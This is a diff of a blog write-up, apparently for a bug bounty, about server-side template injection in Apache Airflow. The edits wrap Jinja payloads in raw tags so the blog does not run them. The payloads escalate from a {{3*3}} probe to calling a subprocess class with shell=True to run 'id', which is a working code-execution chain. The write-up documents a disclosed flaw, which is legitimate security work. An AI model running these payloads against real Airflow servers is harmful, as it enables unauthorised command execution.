@@ -37,9 +37,7 @@ Then, I created a new DAG file (which are actually Python files with the typical
 
 ```
 doc_md="""
-`{{ 3*3 }}`
 {% raw %}{{ 3*3 }}{% endraw %}
-&#123;&#123; 3*3 &#125;&#125;
 """
 ```
 
@@ -51,7 +49,7 @@ Next, the list of classes using the same payload from the Securelayer7 blog:
 
 ```
 doc_md="""
-`{{ ''.__class__.__mro__[1].__subclasses__() }}`
+{% raw %}{{ ''.__class__.__mro__[1].__subclasses__() }}{% endraw %}
 """
 ```
 
@@ -75,7 +73,7 @@ In my case it is the index number 309, so I will first print the name of the cla
 
 ```
 doc_md="""
-`{{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}`
+{% raw %}{{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}{% endraw %}
 """
 ```
 
@@ -87,7 +85,7 @@ If the class name from the previous step is correct, the index is the correct on
 
 ```
 doc_md="""
-{{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
+{% raw %}{{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}{% endraw %}
 """
 ```
 
@@ -235,14 +233,13 @@ But still, I am happy I could order a cool sweater I hope I will be receiving in
 
 <br>
 
+
 --------------------------
 
 ## Sources
 
-- [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/).
+- [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/)
 
 - [HackerOne report](https://hackerone.com/reports/3217840)
 
 <br>
-
-
